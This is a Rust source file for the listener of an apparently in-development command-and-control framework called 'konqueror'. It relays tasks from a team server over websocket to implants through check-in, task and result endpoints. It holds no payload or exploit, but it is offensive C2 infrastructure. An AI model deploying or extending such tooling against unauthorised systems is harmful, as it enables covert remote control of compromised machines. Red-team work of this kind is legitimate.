pub mod api;
pub(crate) mod error;
pub mod types;

use std::sync::Arc;
use tokio::sync::mpsc::Receiver;

use axum::Router;
use axum::routing::post;
use dashmap::DashMap;
use futures_util::{SinkExt, StreamExt};
use konqueror_common::error::KonquerorError;
use konqueror_common::protocol::WsMessage;
use konqueror_common::protocol::decode_ws_message;
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::{MaybeTlsStream, WebSocketStream, connect_async};
use tracing::info;
use tracing::warn;
use tracing_subscriber::EnvFilter;
use uuid::Uuid;

use crate::api::implant::{handle_checkin, handle_result, handle_tasks};
use crate::types::ListenerState;

// TODO we need to gracefully handle errors in this loop so that if any issues with the server, we can retry up to x times
// the if keep failing we just go with

async fn handle_loop(
    ws_stream: WebSocketStream<MaybeTlsStream<TcpStream>>,
    rx: &mut Receiver<WsMessage>,
    state: Arc<ListenerState>,
) -> Result<(), KonquerorError> {
    let (mut write, mut read) = ws_stream.split();
    loop {
        tokio::select! {
            // forward implant data to server
            Some(msg) = rx.recv() => {
                let text = serde_json::to_string(&msg)?;
                write.send(Message::Text(text.into())).await.map_err(|e| KonquerorError::Transport(e.to_string()))?;
            }
            // receive tasks from server
            msg = read.next() => {
                match msg {
                    Some(Ok(msg)) => {
                        // parse and store in pending_tasks
                        let text = msg.to_text().map_err(|e| KonquerorError::Transport(e.to_string()))?;
                        let task = decode_ws_message(text.as_bytes()).map_err(|e| KonquerorError::Transport(e.to_string()))?;

                        match task {
                            WsMessage::NewTask(t) => {
                                // insert in the Vec<Task>
                                state.tasks.entry(t.implant_id).or_default().push(t);
                            }
                            WsMessage::KillListener => {
                                // for now do nothing, we need to inform the implants to kill themselves first
                                // communicate to the server that the implants have been informed,
                                // and shut ourselves down
                                //
                                // TODO
                                return Ok(());
                            }
                            _ => {}
                        }
                    }
                    Some(Err(e)) => {
                        return Err(KonquerorError::Transport(e.to_string()))
                    }
                    None => {
                        return Err(KonquerorError::Transport("server disconnected".to_string()));
                    }
                }
            }
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), KonquerorError> {
    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::from_default_env().add_directive("konqueror=debug".parse().unwrap()),
        )
        .init();

    // create a channel
    let (tx, mut rx) = mpsc::channel::<WsMessage>(100);

    let state = Arc::new(ListenerState {
        tasks: DashMap::new(),
        server_tx: tx,
        // TODO take from config
        listener_id: Uuid::new_v4(),
    });

    let ws_state = state.clone();

    let address = "127.0.0.1";
    let port = "8001";
    let server = "127.0.0.1";
    let server_port = "9001";

    // hardcoded for now
    let (ws_stream, _) = connect_async("ws://127.0.0.1:9001/ws/listener/some-uuid")
        .await
        .expect("Failed to connect");

    info!(
        "Connected to the server at {}:{} via websocket. ",
        server, server_port
    );

    tokio::spawn(async move {
        if let Err(e) = handle_loop(ws_stream, &mut rx, ws_state).await {
            warn!("Err {}", e);
        }
    });

    let app = Router::new()
        .route("/checkin", post(handle_checkin))
        .route("/tasks", post(handle_tasks))
        .route("/result", post(handle_result))
        .with_state(state);

    let listener = tokio::net::TcpListener::bind(format!("{}:{}", &address, &port))
        .await
        .expect("Could not start REST endpoint");

    info!("Started REST API at {}:{}", address, port);

    axum::serve(listener, app)
        .await
        .expect("Could not start REST endpoint");

    Ok(())
}
